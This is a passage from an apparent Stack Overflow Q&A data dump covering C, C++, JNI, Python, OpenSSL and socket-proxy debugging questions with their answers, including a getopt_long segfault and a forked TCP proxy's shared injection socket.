/home/marcoms/code/btcwatch/./btcwatch: unrecognized option '--stack-overflow'
232         btcdbg(""got option '%c'"", opt);
(gdb) 
btcdbg (fmt=0x4032a8 ""got option '%c'"") at src/btcutil.c:50
50  }
(gdb) 
main (argc=2, argv=0x7fffffffe598) at src/main.c:233
233         switch(opt) {
(gdb) 
236                 help(pn, optarg);
(gdb) 
help (prog_nm=0x7fffffffe8d8 ""/home/marcoms/code/btcwatch/./btcwatch"", topic=0x0) at src/btcutil.c:69
69      btcdbg(""help()"");
(gdb) 
btcdbg (fmt=0x403bfc ""help()"") at src/btcutil.c:50
50  }
(gdb) 
help (prog_nm=0x7fffffffe8d8 ""/home/marcoms/code/btcwatch/./btcwatch"", topic=0x0) at src/btcutil.c:71
71      char currcies[][3 + 1] = {
(gdb) 
101     char topics[][16] = {
(gdb) 
117     if(!topic) {
(gdb) 
118         bputs(""Usage: ""); bputs(prog_nm); bputs("" [OPTION]\n"");
(gdb) 
Usage: /home/marcoms/code/btcwatch/./btcwatch [OPTION]
119         bputs(
(gdb) 
Get and monitor Bitcoin trade information

Options:       Long options:
  -C             --compare              comare current price with stored price
  -S             --store                store current price
  -a             --all                  equivalent to -pbs
  -b             --buy                  print buy price
  -c CURRENCY    --currency=CURRENCY    set conversion currency
  -n AMOUNT      --amount=AMOUNT        set the amount to convert
  -o             --colour, --color      enable use of colour
  -p             --ping                 check for a successful JSON response
  -r             --reverse              convert currency to Bitcoin
  -s             --sell                 print sell price
  -v             --verbose              increase verbosity

  -h [topic]     --help[=topic]         print this help, or help designated by topic
                                        use --help=topics for available topics
  -V             --version              print version number

Report bugs to marco@scannadinari.co.uk
btcwatch home page: &lt;https://github.com/marcoms/btcwatch&gt;
142         exit(EXIT_SUCCESS);
(gdb) 
[Inferior 1 (process 25752) exited normally]
</code></pre>

<p>At this point, I really am stumped. What could be causing the segfault? Of course, I could just use <code>error()</code> instead of exit, but that's incredibly unsatisfying.</p>
","9530","","<p>The problem is that your options array is not properly terminated:</p>

<pre><code>    const struct option long_options[] = {
            // ...
            // This is the last element
            {
                    .name = ""verbose"",
                    .has_arg = no_argument,
                    .flag = NULL,
                    .val = 'v'
            }
    };
</code></pre>

<p><a href=""http://linux.die.net/man/3/getopt_long"" rel=""nofollow""><code>getopt_long(3)</code></a> requires that the options array be terminated with all zeros so that it knows how big the array is -- notice that you never actually pass the array size into <code>getopt_long</code>.  So what's happening is it's walking past the end of your array, looking for the terminator, and then it starts reading memory out-of-bounds, which Valgrind rightly complains about.  Undefined Behavior results.</p>

<p>The fix is simple:</p>

<pre><code>const struct option long_options[] = {
            // ...
            {
                    .name = ""verbose"",
                    .has_arg = no_argument,
                    .flag = NULL,
                    .val = 'v'
            },

            // Array terminator
            {0, 0, 0, 0}
};
</code></pre>
"
"<p>Imagin this:</p>

<pre><code>void *ImCalledByThreads (/*...*/)
{
    //some stuff
    static typePlaceholder AmIThreadSafe = QuestionTag();
    //other stuff
}
</code></pre>

<p>Is this initialisation threadsafe?</p>

<p>Even if <code>QuestionTag()</code> is threadsafe, What happens if the first thread runs the function and another invokes this line. Would there be a detection that the function will only be executed once? or is this simply just a bad idea for multithreading?</p>
","9530","","<p>It's not legal C code, since C requires initializers of static variables to be compile-time constants.  Hence the initialization can happen at program load time, before any threads have a chance to be started, so there can be no race conditions there.</p>

<p>From C99 §6.7.8/4:</p>

<blockquote>
  <p>All the expressions in an initializer for an object that has static storage duration shall be constant expressions or string literals.</p>
</blockquote>

<p>Visual Studio may allow non-constants as a non-standard extension, but for that, all bets are off.  Check its documentation and/or its generated assembly code to see if it's thread-safe or not.</p>

<p>For C++, where non-constants initializers are allowed, see the question <a href=""http://stackoverflow.com/questions/11939484/is-initialization-of-local-static-function-object-thread-safe"">Is initialization of local static function-object thread-safe?</a>.  Short answer: Yes, in C++11, no in C++03 and earlier (which don't mention threads in the standard), though compilers may still make it thread-safe if they choose.</p>
"
"<p>The problem is, when I'm debugging my app on device, it doesn't call Exception Breakpoints.
For example, when I debug the following code on simulator</p>

<pre><code>NSArray* array = [[NSArray alloc] initWithObjects:@""1"",@""2"", nil];
NSLog(@""%@"",array[3]);
</code></pre>

<p>It works fine and stops with the breakpoint and NSRangeException
But when I'm debugging it on device, I see the following 
<img src=""http://i.stack.imgur.com/iwPmc.png"" alt=""enter image description here""></p>

<p>Any help would be appreciated</p>
","9530","","<p>What's the problem?  It stopped right where the exception was thrown, inside the call to <code>objc_exception_throw()</code>, as the stack trace on the left indicates.  If you drag the slider at the bottom of the debug navigator all the way to the right, you can see the full stack trace.</p>

<p>If you want to see what the exception being thrown is, it's in the first (and only) parameter.  On ARM, the first parameter is passed in the R0 register, so you can see it with this command in the debugger console:</p>

<pre><code>(lldb) print-object $r0
</code></pre>

<p>Or you can just continue in the debugger, and if the exception isn't caught, it'll be printed out to the console.</p>
"
"<p>I am trying to use <code>JNI</code> with <code>C++</code> but it is not going right I have justified all the steps to call a <code>c++</code> method from <code>java</code> . but I am getting following error (Java code and C++ code is given below)</p>

<p><strong>Java Code is here</strong></p>

<pre><code>public class KeyLogger {
    public native void capture();
    static{
        System.loadLibrary(""KeyLogger"");
    }
    public static void main(String[]args){

        KeyLogger obj = new KeyLogger();
        obj.capture();
    }
}
</code></pre>

<p><strong>C++ code here</strong></p>

<pre><code>**// All libraries included Fucntion goes here.** 

JNIEXPORT void JNICALL Java_KeyLogger_capture
(JNIEnv *env, jobject obj){

    cout&lt;&lt;""Working Fine""&lt;&lt;endl;
}
void main(){}
</code></pre>

<p><strong>Error</strong></p>

<pre><code>Exception in thread ""main"" java.lang.UnsatisfiedLinkError: KeyLogger.capture()V
    at KeyLogger.capture(Native Method)
    at KeyLogger.main(KeyLogger.java:10)
</code></pre>

<p>What should i do for this to get solved</p>
","9530","","<p>You need to declare your C++ method as <code>extern ""C""</code> to ensure that its symbol name is not mangled and can be found by the dynamic linker:</p>

<pre><code>extern ""C""
{
...
JNIEXPORT void JNICALL Java_KeyLogger_capture(JNIEnv *env, jobject obj) {
    ...
}
...
}  // end extern ""C""
</code></pre>

<p>Alternatively, instead of using generated function names which can be difficult to get exactly right, you can use the <a href=""http://docs.oracle.com/javase/6/docs/technotes/guides/jni/spec/functions.html#wp17734"" rel=""nofollow""><code>RegisterNatives()</code></a> function to register the native methods from within your <a href=""http://docs.oracle.com/javase/6/docs/technotes/guides/jni/spec/invocation.html#JNI_OnLoad"" rel=""nofollow""><code>JNI_OnLoad()</code></a> routine.</p>
"
"<p>I have below JSON String. Now I want to extract each individual field from that JSON string.</p>

<p>So I decided to create a method parse_json which will accept a variable that I want to extract from the JSON String.</p>

<p>Below is my python script -</p>

<pre><code>#!/usr/bin/python

import json

jsonData = '{""pp"": [0,3,5,7,9], ""sp"": [1,2,4,6,8]}'

def parse_json(data):
    jj = json.loads(jsonData)
    return jj['+data+']

print parse_json('pp')
</code></pre>

<p>Now whenever I an passing <code>pp</code> to <code>parse_json</code> method to extract its value from the JSON String, I always get the error as - </p>

<pre><code>return jj['+data+']
KeyError: '+data+'
</code></pre>

<p>Any idea how to fix this issue? As I need to pass the variable which I am supposed to extract from the JSON String?</p>
","9530","","<p>You probably just want this:</p>

<pre><code>    return jj[data]
</code></pre>

<p>Your code is trying to look up a key named literally <code>'+data+'</code>, when instead what you want to do is look up the key with a name of the function's parameter.</p>
"
"<p>When I try to read the source of the page , I get the following output</p>

<pre><code>  Traceback (most recent call last):
  File ""price.py"", line 179, in &lt;module&gt;
    l_soup = BeautifulSoup(urllib2.urlopen(l_link).read())
  File ""/usr/lib/python2.7/urllib2.py"", line 127, in urlopen
    return _opener.open(url, data, timeout)
  File ""/usr/lib/python2.7/urllib2.py"", line 410, in open
    response = meth(req, response)
  File ""/usr/lib/python2.7/urllib2.py"", line 523, in http_response
    'http', request, response, code, msg, hdrs)
  File ""/usr/lib/python2.7/urllib2.py"", line 448, in error
    return self._call_chain(*args)
  File ""/usr/lib/python2.7/urllib2.py"", line 382, in _call_chain
    result = func(*args)
  File ""/usr/lib/python2.7/urllib2.py"", line 531, in http_error_default
    raise HTTPError(req.get_full_url(), code, msg, hdrs, fp)
urllib2.HTTPError: HTTP Error 504: Gateway Time-out
</code></pre>

<p>My code.py (After removing irrelevant stuff) :</p>

<pre><code>isbn = str(9780593072493)
l_link = ""http://www.landmarkonthenet.com/books/search/""+isbn
l_soup = BeautifulSoup(urllib2.urlopen(l_link).read())
l_temp = l_soup.select("".price-current"")
</code></pre>

<p>How can I resolve this ?
Is the redirection of l_link causing problem over here ? Thanks in Advance.</p>

<p>PS : I've already searched for the problem and couldn't find anything useful.</p>
","9530","","<p><a href=""https://en.wikipedia.org/wiki/List_of_http_status_codes#5xx_Server_Error"" rel=""nofollow"">5xx status codes</a> are problems with the server (compared with 4xx status codes, which are problems with the client).  This means you sent the server a valid request, but the server was unable to serve a valid response.</p>

<p>Your code is fine, but the server (or in this case, a gateway that the server is using) is having problems.  You just need to wait patiently for the server to resolve its own issues, or contact the server administrator and inform them that their server is misbehaving.</p>
"
"<p>I wrote a man-in-the-middle/proxy server initially on my mac. Essentially the proxy creates a socket and waits for a connection, then connects to another application. This works flawlessly on in OS X and in OpenBSD; however, when porting the proxy to Ubuntu, it doesn't work as intended.</p>

<p>There is two instances of this proxy running, listening on two separate ports. When this is ran on Ubuntu, all the traffic goes through a single port. I also run into a problem when setting the socket to nonblocking (through fcntl) that sometimes it fails with ""Invalid Argument""</p>

<p>I am using sys/socket.</p>

<p>Any pitfalls during this port that I am missing?</p>

<p><strong>EDIT:</strong></p>

<p>I believe there are two problems. One being the Invalid Argument, the other being that traffic is being pushed to different ports.</p>

<p><img src=""http://i.stack.imgur.com/HR0XE.png"" alt=""traffic issue""></p>

<p>Service 1 binds to Proxy instance 1 which then binds back to the appropriate service on the black box, which kicks off service 2. However, for some reason on Ubuntu it connects to the Instance 1 which is listening on the incorrect port.</p>

<p><strong>EDIT Solution to Invalid Argument for fcntl:</strong></p>

<p>Found out why i was getting the invalid argument, sadly i'm still having the other issue.
fcntl(fd, cmd, arg)</p>

<p>cmd - F_SETFL(long)</p>

<p>I was passing in a pointer to an int instead of the long primitive.</p>

<p><strong>EDIT:</strong></p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;errno.h&gt;
#include &lt;netdb.h&gt;
#include &lt;string.h&gt;
#include &lt;signal.h&gt;
#include &lt;assert.h&gt;
#include &lt;syslog.h&gt;


#include &lt;sys/types.h&gt;
#include &lt;sys/select.h&gt;
#include &lt;sys/file.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;sys/param.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;sys/wait.h&gt;

#include &lt;netinet/in.h&gt;

#include &lt;arpa/ftp.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;arpa/telnet.h&gt;


void cleanup(int sig)
{
    syslog(LOG_INFO, ""Cleaning up..."");
    exit(0);
}

void sigreap(int sig)
{
    int status;
    pid_t p;
    while ((p = waitpid(-1, &amp;status, WNOHANG)) &gt; 0) {
    syslog(LOG_INFO, ""sigreap: pid=%d, status=%d\n"", (int) p, status);
    }
    /* doh! */
    signal(SIGCHLD, sigreap);
}

void set_nonblock(int fd)
{
    long fl;
    int x;
    fl = fcntl(fd, F_GETFL);
    if (fl &lt; 0) {
    syslog(LOG_ERR, ""fcntl F_GETFL: FD %d: %s"", fd, strerror(errno));
    exit(1);
    }
    fl |= O_NONBLOCK;
    x = fcntl(fd, F_SETFL, fl);
    if (x &lt; 0) {
    syslog(LOG_ERR, ""fcntl F_SETFL: FD %d: %s"", fd, strerror(errno));
    exit(1);
    }
}


int create_server_sock(char *addr, int port)
{
    int addrlen, s, on = 1, x;
    static struct sockaddr_in client_addr;

    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s &lt; 0)
        perror(""socket""), exit(1);

    addrlen = sizeof(client_addr);
    memset(&amp;client_addr, '\0', addrlen);
    client_addr.sin_family = AF_INET;
    client_addr.sin_addr.s_addr = INADDR_ANY; //inet_addr(addr);
    client_addr.sin_port = htons(port);
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &amp;on, 4);
    x = bind(s, (struct sockaddr *) &amp;client_addr, addrlen);
    if (x &lt; 0)
        perror(""bind""), exit(1);

    x = listen(s, 5);
    if (x &lt; 0)
        perror(""listen""), exit(1);

    return s;
}

int open_remote_host(char *host, int port)
{
    struct sockaddr_in rem_addr;
    int len, s, x;
    struct hostent *H;
    int on = 1;

    H = gethostbyname(host);
    if (!H)
    return (-2);

    len = sizeof(rem_addr);

    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s &lt; 0)
    return s;

    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &amp;on, 4);

    len = sizeof(rem_addr);
    memset(&amp;rem_addr, '\0', len);
    rem_addr.sin_family = AF_INET;
    memcpy(&amp;rem_addr.sin_addr, H-&gt;h_addr, H-&gt;h_length);
    rem_addr.sin_port = htons(port);
    x = connect(s, (struct sockaddr *) &amp;rem_addr, len);
    if (x &lt; 0) {
    close(s);
    return x;
    }
    set_nonblock(s);
    return s;
}

int get_hinfo_from_sockaddr(struct sockaddr_in addr, int len, char *fqdn)
{
    struct hostent *hostinfo;

    hostinfo = gethostbyaddr((char *) &amp;addr.sin_addr.s_addr, len, AF_INET);
    if (!hostinfo) {
    sprintf(fqdn, ""%s"", inet_ntoa(addr.sin_addr));
    return 0;
    }
    if (hostinfo &amp;&amp; fqdn)
    sprintf(fqdn, ""%s [%s]"", hostinfo-&gt;h_name, inet_ntoa(addr.sin_addr));
    return 0;
}


int wait_for_connection(int s)
{
    int newsock;
    socklen_t len;
    static struct sockaddr_in peer;

    len = sizeof(struct sockaddr);
    newsock = accept(s, (struct sockaddr *) &amp;peer, &amp;len);
    /* dump_sockaddr (peer, len); */
    if (newsock &lt; 0) {
    if (errno != EINTR)
        perror(""accept"");
    }
    get_hinfo_from_sockaddr(peer, len, client_hostname);
    set_nonblock(newsock);
    return (newsock);
}



static int print_bytes(char * buf, ssize_t length)
{
    int i = 0, ascii_off = 0, hex_off = 0;
    char * hex_bytes = (char *) calloc(32*2,1);
    char * ascii_bytes = (char *) calloc(32*2,1);

    for( i = 0; i &lt; length; i++)
    {
        hex_off += sprintf(hex_bytes+hex_off,""%02X "",(unsigned char)buf[i]);
        if(buf[i] &gt;= '!' &amp;&amp; buf[i] &lt;= '~')
            ascii_off += sprintf(ascii_bytes+ascii_off,""%c "",buf[i]);
        else
            ascii_off += sprintf(ascii_bytes+ascii_off,"". "");
        if( ((i+1) % 16 == 0) || i == length-1 )
        {
            fprintf(stderr,""%-48s\t%s\n"",hex_bytes,ascii_bytes);
            free(hex_bytes);
            free(ascii_bytes);
            hex_bytes = (char *) calloc(32*2,1);
            ascii_bytes = (char *) calloc(32*2,1);
            ascii_off = 0;
            hex_off = 0;
            if(i != length-1)
                fprintf(stderr,""\t"");
        }


    }
    free(hex_bytes);
    free(ascii_bytes);
    return 0;
}


int mywrite(int fd, char *buf, int *len)
{
    int x = write(fd, buf, *len);
    print_bytes(buf,*len);
    if (x &lt; 0)
        return x;
    if (x == 0)
        return x;
    if (x != *len)
        memmove(buf, buf+x, (*len)-x);
    *len -= x;
    return x;
}


void service_client(int fd1, int fd2, int injfd)
{
    int maxfd;

    cfd = fd1;
    sfd = fd2;
    char *sbuf;
    char *cbuf;
    int x, n;
    int cbo = 0;
    int sbo = 0;
    int ibo = 0;
    fd_set R;
    int max_clients = 30;
    int i = 0,s = 0, addrlen;
    struct sockaddr_in address;

    sbuf = malloc(BUF_SIZE);
    cbuf = malloc(BUF_SIZE);
    cntrlbuf = calloc(1,BUF_SIZE);
    char * injbuf = malloc(BUF_SIZE);
    maxfd = cfd &gt; sfd ? cfd : sfd; 
    maxfd = injfd &gt; maxfd ? injfd : maxfd;
    maxfd++;
    maxfd++;

    struct inj_con * ptr;

    while (1) {
        struct timeval to;
        if (cbo) {
            process_packet(cbuf,&amp;cbo,sfd);
        }
        if (sbo) {
            process_packet(sbuf,&amp;sbo,cfd);
        }
        if (ibo) {
            process_packet(injbuf,&amp;ibo,cfd);
        }
        if (cntrlo) {
            fprintf(stderr,""\033[33;1mControl-&gt;(%d), len = 0x%x (%d):\033[0m\n\t"",cfd,cntrlo,cntrlo);
            if (mywrite(cfd, cntrlbuf, &amp;cntrlo) &lt; 0 &amp;&amp; errno != EWOULDBLOCK) {
                syslog(LOG_ERR, ""write %d: %s"", cfd, strerror(errno));
                exit(1);
            }
        }
        FD_ZERO(&amp;R);
        if (cbo &lt; BUF_SIZE)
            FD_SET(cfd, &amp;R);
        if (sbo &lt; BUF_SIZE)
            FD_SET(sfd, &amp;R);
        if (ibo &lt; BUF_SIZE)
            FD_SET(injfd, &amp;R);



        to.tv_sec = 0;
        to.tv_usec = 1000;
        x = select(max_clients+3, &amp;R, 0, 0, &amp;to);
        if (x &gt; 0 || cntrl_q-&gt;item_count &gt; 0) {
            if (FD_ISSET(injfd, &amp;R)) {
                int new_socket;
                if((new_socket = accept(injfd, (struct sockaddr *) &amp;address, (socklen_t *) &amp;addrlen)) &lt; 0)
                {
                    perror(""accept"");
                    exit(1);
                }


                // Truncated
                //
            }

            char * temp_pkt; 

            if (FD_ISSET(cfd, &amp;R)) {
                temp_pkt = (char *) calloc(BUF_SIZE,1);
                n = read(cfd, temp_pkt, BUF_SIZE);
                syslog(LOG_INFO, ""read %d bytes from CLIENT (%d)"", n, cfd);
                if (n &gt; 0) {
                    push_msg(s_q,temp_pkt,n);
                } else {
                    free(temp_pkt);
                    close(cfd);
                    close(sfd);
                    close_injection_sockets(); 
                    close(injfd);
                    _exit(0);
                }
            } 
            if (FD_ISSET(sfd, &amp;R)) {
                temp_pkt = (char *) calloc(BUF_SIZE,1);
                n = read(sfd, temp_pkt, BUF_SIZE);
                syslog(LOG_INFO, ""read %d bytes from SERVER (%d)\n"", n, sfd);
                if (n &gt; 0) {
                    push_msg(c_q,temp_pkt,n);
                } else {
                    free(temp_pkt);
                    close(sfd);
                    close(cfd);
                    close_injection_sockets(); 
                    close(injfd);
                    _exit(0);
                }
            }

            if(cntrlo == 0 &amp;&amp; cntrl_q-&gt;front != NULL)
            {
                struct msg * tmp = next_msg(cntrl_q);
                if(tmp != NULL)
                {
                    memcpy(cntrlbuf,tmp-&gt;msg,tmp-&gt;len);
                    cntrlo += tmp-&gt;len;
                    free(tmp-&gt;msg);
                    free(tmp);
                }
            }
            if(sbo == 0 &amp;&amp; c_q-&gt;front != NULL)
            {
                struct msg * tmp = next_msg(c_q);
                if(tmp != NULL)
                {
                    memcpy(sbuf,tmp-&gt;msg,tmp-&gt;len);
                    sbo += tmp-&gt;len;
                    free(tmp-&gt;msg);
                    free(tmp);
                }
            }
            if(cbo == 0 &amp;&amp; s_q-&gt;front != NULL)
            {
                struct msg * tmp = next_msg(s_q);
                if(tmp != NULL)
                {
                    memcpy(cbuf,tmp-&gt;msg,tmp-&gt;len);
                    cbo += tmp-&gt;len;
                    free(tmp-&gt;msg);
                    free(tmp);
                }
            }
            if(ibo == 0 &amp;&amp; inj_q-&gt;front != NULL)
            {
                struct msg * tmp = next_msg(inj_q);
                if(tmp != NULL)
                {
                    memcpy(injbuf,tmp-&gt;msg,tmp-&gt;len);
                    ibo += tmp-&gt;len;
                    free(tmp-&gt;msg);
                    free(tmp);
                }
            }

        } else if (x &lt; 0 &amp;&amp; errno != EINTR) {
            close(sfd);
            close(cfd);
            _exit(0);
        }

    }
}


static int create_injection_sock(int injectionport)
{
    struct sockaddr_in serv_addr;
    int portno = injectionport;

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    if (sockfd &lt;0)
    {
        perror(""ERROR: opening socket"");
        exit(1);
    }

    bzero((char *) &amp;serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(portno);

    if (bind(sockfd, (struct sockaddr *) &amp;serv_addr, sizeof(serv_addr)) &lt; 0)
    {
        perror(""ERROR: on bind"");
        exit(1);
    }

    if (listen(sockfd,5) &lt; 0 )
    {
        perror(""listen injection"");
        exit(1);
    }
    return sockfd;
}


int main(int argc, char *argv[])
{

    if (!(5 == argc || 6 == argc)) {
        fprintf(stderr, ""usage: %s laddr lport rhost rport [injectionport]\n"", argv[0]);
        exit(1);
    }

    char *localaddr = strdup(argv[1]);
    int localport = atoi(argv[2]);
    char *remoteaddr = strdup(argv[3]);
    int remoteport = atoi(argv[4]);
    int injectionport;
    if(argc == 6)
        injectionport  = atoi(argv[5]);
    int client, server;
    int master_sock;
    int injection_sock = -1;

    cntrl_q = (struct item_queue *) calloc(1,sizeof(struct item_queue));
    inj_q = (struct item_queue *) calloc(1,sizeof(struct item_queue));
    s_q = (struct item_queue *) calloc(1,sizeof(struct item_queue));
    c_q = (struct item_queue *) calloc(1,sizeof(struct item_queue));
    identities = (struct item_queue *) calloc(1,sizeof(struct item_queue));


    assert(localaddr);
    assert(localport &gt; 0);
    assert(remoteaddr);
    assert(remoteport &gt; 0);
    if(argc == 6)
        assert(injectionport &gt; 0);

    openlog(argv[0], LOG_PID, LOG_LOCAL4);

    signal(SIGINT, cleanup);
    signal(SIGCHLD, sigreap);
    if(argc == 6)
        injection_sock = create_injection_sock(injectionport);
    master_sock = create_server_sock(localaddr, localport);
    for (;;) {
        if ((client = wait_for_connection(master_sock)) &lt; 0)
            continue;
        if ((server = open_remote_host(remoteaddr, remoteport)) &lt; 0)
            continue;
        if (!fork()) {
            service_client(client, server, injection_sock);
            }
            close(client);
            close(server);
        }

}
</code></pre>
","9530","","<p>Just a guess, but I think your problem is the way you're handling the injection socket.  I don't know what you deleted in the <code>// TRUNCATED</code> code block, but basically what you're doing is this:</p>

<pre><code>// Parent process -- bind &amp; listen on the injection socket
injfd = socket(...);
bind(injfd, ...);
listen(injfd, ...);
...
while (1)
{
    client = wait_for_connection();
    ...
    if (!fork())
    {
        // Each child process
        ...
        if (stuff &amp;&amp; FD_ISSET(injfd, &amp;R)) {
            new_socket = accept(injfd);
            ...
        }
        ...
    }
    ...
}
</code></pre>

<p>In other words, <strong>all</strong> of your child processes are listening on the same injection socket and trying to accept connections.  I'm not sure if this even well-defined behavior, but even in the best case, when a new connection arrives on the injection port, the process that is going to accept the connection could be random and uncontrollable.  It could be any of the child processes or even the parent process.</p>

<p>In order to control that behavior, you need to decide who should be listening for connections on the injection socket.  If only the parent should be listening, then only the parent should call <code>accept()</code> on it or pass it as an argument to <code>select()</code>.  Likewise, if only a particular child should be listening, then only that child should call <code>accept()</code> or pass it to <code>select()</code>.  All other processes that are ignoring that socket should <code>close()</code> it at their earliest convenience (e.g. immediately after <code>fork()</code> returns) to avoid leaking file descriptors.</p>
"
"<p>I am trying to open an image using fopen command. I have to use this command twice for getting it working. Why is it so? Here is my code:</p>

<pre><code>  fid = fopen(filename, 'r');
  opened = fopen(fid);
  figure,imshow(opened);
</code></pre>
","9530","","<p>The second call just gets the full path of the filename of the file which was previously opened.  From <a href=""http://www.mathworks.com/help/matlab/ref/fopen.html"" rel=""nofollow"">the documentation</a></p>

<blockquote>
  <p><code>filename = fopen(fileID)</code> returns the file name that a previous call to <code>fopen</code> used when it opened the file specified by <code>fileID</code>. The output filename is resolved to the full path. The <code>fopen</code> function does not read information from the file to determine the output value. </p>
</blockquote>
"
"<p>Is this code snippet portable?</p>

<p>definition:    </p>

<pre><code>#define log(...)  std::cout &lt;&lt; __FILE__ &lt;&lt; ""["" &lt;&lt; __LINE__  &lt;&lt; ""]:"" \
                            &lt;&lt; string_format(__VA_ARGS__) \
                            &lt;&lt; std::endl &lt;&lt; std::flush
</code></pre>

<p>usage:</p>

<pre><code>log(""i = %d"", i);
</code></pre>

<p>and string_format is sprintf that outputs a std::string taken from <a href=""http://stackoverflow.com/a/8098080/624074"">http://stackoverflow.com/a/8098080/624074</a> It works with my gcc 4.6.3 here but I don't want to have compilation issues later with other compilers.</p>
","9530","","<p>It's pretty portable, for the most part.  It's part of the C++11 language standard (as well as C99), so most modern compilers support it.  You might run into problems with older compilers that only support C++03.</p>
"
"<p>I use TextEdit and gcc on OS X 10.7 to make small terminal programs. I'm trying to learn how to program OpenSSL, but I'm having dramas compiling (due to the deprecated issue - more below). I've Googled and searched on SO but everything I read is either pre-2011 (when the issue seemed to appear), specific to iOS (I'm programming for OS X but trying to be platform independent) or talks about using XCode (which I don't - I prefer TextEdit).</p>

<p>Can anyone please point in the right direction of a simple, step-by-step process for how to install an OpenSSL program on OS X using gcc?</p>

<p>For the record, this is the exact steps I have taken:</p>

<ul>
<li><p>OpenSSL installed via macports</p></li>
<li><p>'openssl version' returns ""OpenSSL 1.0.1e 11 Feb 2013""</p></li>
<li><p>I'm trying to compile this file: <a href=""http://saju.net.in/code/misc/openssl_aes.c.txt"" rel=""nofollow"">http://saju.net.in/code/misc/openssl_aes.c.txt</a></p></li>
<li><p>I've renamed to 'aes.c' and I'm using 'gcc -o aes aes.c'</p></li>
<li><p>I've tried the following flags (for no result): -lcrypto, lssl, -Wno-error=deprecated-declarations</p></li>
</ul>

<p>The specific output I get from gcc is the following:</p>

<pre><code>Brads-MacBook-Air:Desktop brad$ gcc -o aes aes.c -lssl -lcrypto -Wno-error=deprecated-declarations
aes.c: In function ‘aes_init’:
aes.c:30: warning: ‘EVP_BytesToKey’ is deprecated (declared at /usr/include/openssl/evp.h:572)
aes.c:30: warning: ‘EVP_aes_256_cbc’ is deprecated (declared at /usr/include/openssl/evp.h:786)
aes.c:30: warning: ‘EVP_sha1’ is deprecated (declared at /usr/include/openssl/evp.h:666)
aes.c:36: warning: ‘EVP_CIPHER_CTX_init’ is deprecated (declared at /usr/include/openssl/evp.h:636)
aes.c:37: warning: ‘EVP_EncryptInit_ex’ is deprecated (declared at /usr/include/openssl/evp.h:581)
aes.c:37: warning: ‘EVP_aes_256_cbc’ is deprecated (declared at /usr/include/openssl/evp.h:786)
aes.c:38: warning: ‘EVP_CIPHER_CTX_init’ is deprecated (declared at /usr/include/openssl/evp.h:636)
aes.c:39: warning: ‘EVP_DecryptInit_ex’ is deprecated (declared at /usr/include/openssl/evp.h:590)
aes.c:39: warning: ‘EVP_aes_256_cbc’ is deprecated (declared at /usr/include/openssl/evp.h:786)
aes.c: In function ‘aes_encrypt’:
aes.c:51: error: ‘AES_BLOCK_SIZE’ undeclared (first use in this function)
aes.c:51: error: (Each undeclared identifier is reported only once
aes.c:51: error: for each function it appears in.)
aes.c:55: warning: ‘EVP_EncryptInit_ex’ is deprecated (declared at /usr/include/openssl/evp.h:581)
aes.c:59: warning: ‘EVP_EncryptUpdate’ is deprecated (declared at /usr/include/openssl/evp.h:583)
aes.c:62: warning: ‘EVP_EncryptFinal_ex’ is deprecated (declared at /usr/include/openssl/evp.h:584)
aes.c: In function ‘aes_decrypt’:
aes.c:75: error: ‘AES_BLOCK_SIZE’ undeclared (first use in this function)
aes.c:77: warning: ‘EVP_DecryptInit_ex’ is deprecated (declared at /usr/include/openssl/evp.h:590)
aes.c:78: warning: ‘EVP_DecryptUpdate’ is deprecated (declared at /usr/include/openssl/evp.h:592)
aes.c:79: warning: ‘EVP_DecryptFinal_ex’ is deprecated (declared at /usr/include/openssl/evp.h:594)
aes.c: In function ‘main’:
aes.c:136: warning: ‘EVP_CIPHER_CTX_cleanup’ is deprecated (declared at /usr/include/openssl/evp.h:637)
aes.c:137: warning: ‘EVP_CIPHER_CTX_cleanup’ is deprecated (declared at /usr/include/openssl/evp.h:637)
</code></pre>
","9530","","<p>The deprecation warnings are just that, warnings, and can be ignored.  The real problem is that the compiler can't see the declaration of the <code>AES_BLOCK_SIZE</code> macro, which is defined to <code>aes.h</code>.  So you need to add a <code>#include &lt;openssl/aes.h&gt;</code> to your source code.</p>

<p>You'll also need to include the <code>-lcrypto</code> linker flag to link against the OpenSSL runtime library; otherwise, you'll get a bunch of ""undefined reference"" errors.</p>
"
"<p>I have a piece of code as below</p>

<pre><code>    Local_DATA[0] =  * ((int32_T *) event_structure + 1);
    Local_DATA[1] =  * ((int32_T *) event_structure + 2);
    Local_DATA[2] =  * ((int32_T *) event_structure + 3);
    Local_DATA[3] =  * ((int32_T *) event_structure + 4);
</code></pre>

<p>I would have to make a preprocessor like </p>

<pre><code>    #ifdef ABC
            Local_DATA[0] =  * ((int32_T *) event_structure + 1);
            Local_DATA[1] =  * ((int32_T *) event_structure + 2);
            Local_DATA[2] =  * ((int32_T *) event_structure + 3);
            Local_DATA[3] =  * ((int32_T *) event_structure + 4);
    #else
            Local_DATA[0] =  ntohl (* ((int32_T *) event_structure + 1));
            Local_DATA[1] =  ntohl (* ((int32_T *) event_structure + 2));
            Local_DATA[2] =  ntohl (* ((int32_T *) event_structure + 3));
            Local_DATA[3] =  ntohl (* ((int32_T *) event_structure + 4));
    #endif
</code></pre>

<p>I have many lines of code where I have to manually perform this. Is there any way to have something like a macro defined?</p>
","9530","","<p>Sure, just use a function-style macro:</p>

<pre><code>#if ABC
#define MYORDER(x) (x)
#else
#define MYORDER(x) ntohl(x)
#endif
...

Local_DATA[0] =  MYORDER(* ((int32_T *) event_structure + 1));
Local_DATA[1] =  MYORDER(* ((int32_T *) event_structure + 2));
Local_DATA[2] =  MYORDER(* ((int32_T *) event_structure + 3));
Local_DATA[3] =  MYORDER(* ((int32_T *) event_structure + 4));
</code></pre>
"
"<p>I have a simpletcp example: </p>

<pre><code>import socket
import time


TCP_IP = '127.0.0.1'
TCP_PORT = 81
BUFFER_SIZE = 1024

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
